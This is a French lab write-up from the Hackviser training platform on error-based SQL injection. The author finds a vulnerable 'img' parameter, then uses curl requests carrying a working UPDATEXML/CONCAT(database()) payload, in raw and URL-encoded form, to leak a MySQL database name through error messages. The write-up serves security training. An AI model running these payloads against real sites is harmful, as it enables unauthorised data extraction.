# Writeup: Lab Hackviser - Error-Based SQL Injection

## Introduction

Ce laboratoire avait pour objectif de réaliser une attaque par injection SQL basée sur les erreurs afin de découvrir le nom de la base de données d'une application web vulnérable. L'attaque devait être menée en utilisant le paramètre `img` dans l'URL.

## Reconnaissance

1.  **Analyse initiale de l'application web**
    J'ai commencé par explorer l'application à l'adresse `https://kind-liberty.europe1.hackviser.space` pour comprendre son fonctionnement et identifier les points d'entrée potentiels. J'ai utilisé `curl` pour récupérer le contenu de la page :

    ```bash
    curl -s 'https://kind-liberty.europe1.hackviser.space/?img=1'
    ```

    Le résultat a montré une page HTML normale sans erreur apparente. Il y avait une balise `<img>` mais son `src` ne semblait pas directement lié au paramètre `img` de l'URL.

2.  **Test de vulnérabilité avec une apostrophe**
    Pour vérifier si le paramètre `img` était vulnérable à l'injection SQL, j'ai tenté d'injecter une simple apostrophe (`) dans la valeur du paramètre. Cette technique est couramment utilisée pour détecter les erreurs de syntaxe SQL.

    ```bash
    curl "https://kind-liberty.europe1.hackviser.space/?img=1'"
    ```

## Vulnérabilité

L'injection de l'apostrophe a provoqué une erreur fatale (`Fatal error`) affichée directement sur la page web :

```
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 in /var/www/html/index.php:36
```

Cette erreur a confirmé plusieurs points importants :
*   Le paramètre `img` est vulnérable à l'injection SQL.
*   L'application utilise une base de données MySQL (indiqué par "MySQL server version").
*   Les erreurs SQL sont affichées sur la page, ce qui permet une attaque par injection SQL basée sur les erreurs.

## Exploitation

Pour extraire le nom de la base de données, j'ai utilisé la fonction `UPDATEXML` de MySQL. Cette fonction est souvent utilisée dans les injections basées sur les erreurs car elle peut provoquer une erreur si son deuxième argument (le chemin XPath) est mal formé, et cette erreur inclura la sous-requête que l'on souhaite exfiltrer.

La charge utile (payload) utilisée était la suivante :

`1 AND (SELECT UPDATEXML(1,CONCAT(0x2e,database(),0x2e),1))`

Explication de la charge utile :
*   `1`: Une valeur valide pour le paramètre `img` afin de ne pas perturber le début de la requête.
*   `AND`: Opérateur logique pour ajouter une condition à la requête SQL.
*   `(SELECT UPDATEXML(1,CONCAT(0x2e,database(),0x2e),1))`: Cette sous-requête a été conçue pour provoquer une erreur et révéler le nom de la base de données :
    *   `database()`: Fonction MySQL qui retourne le nom de la base de données actuelle.
    *   `CONCAT(0x2e,database(),0x2e)`: Concatène le nom de la base de données avec des points (représentés par `0x2e` en hexadécimal) de chaque côté. Par exemple, si le nom de la base de données est `mydb`, cela deviendrait `.mydb.`.
    *   `UPDATEXML(1, '...', 1)`: Le deuxième argument de `UPDATEXML` attend un chemin XPath valide. En lui passant une chaîne comme `.mydb.`, qui n'est pas un XPath valide, MySQL génère une erreur contenant cette chaîne, révélant ainsi le nom de la base de données.

Lors de la première tentative avec `curl`, la commande a échoué car les caractères spéciaux de la charge utile n'étaient pas encodés pour l'URL.

```bash
curl "https://kind-liberty.europe1.hackviser.space/?img=1 AND (SELECT UPDATEXML(1,CONCAT(0x2e,database(),0x2e),1))"
# Output: curl: (3) URL rejected: Malformed input to a URL function
```

J'ai ensuite encodé la charge utile (`1 AND (SELECT UPDATEXML(1,CONCAT(0x2e,database(),0x2e),1))`) pour l'URL :

`1%20AND%20%28SELECT%20UPDATEXML%281%2CCONCAT%280x2e%2Cdatabase%28%29%2C0x2e%29%2C1%29%29`

La commande `curl` finale a été :

```bash
curl "https://kind-liberty.europe1.hackviser.space/?img=1%20AND%20%28SELECT%20UPDATEXML%281%2CCONCAT%280x2e%2Cdatabase%28%29%2C0x2e%29%2C1%29%29"
```

## Solution

L'exécution de la commande `curl` avec la charge utile encodée a produit l'erreur suivante sur la page :

```
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: 'heritage_marvels.' in /var/www/html/index.php:36
```

Le message d'erreur `XPATH syntax error: 'heritage_marvels.'` a révélé le nom de la base de données.

Le nom de la base de données est : **`heritage_marvels`**.
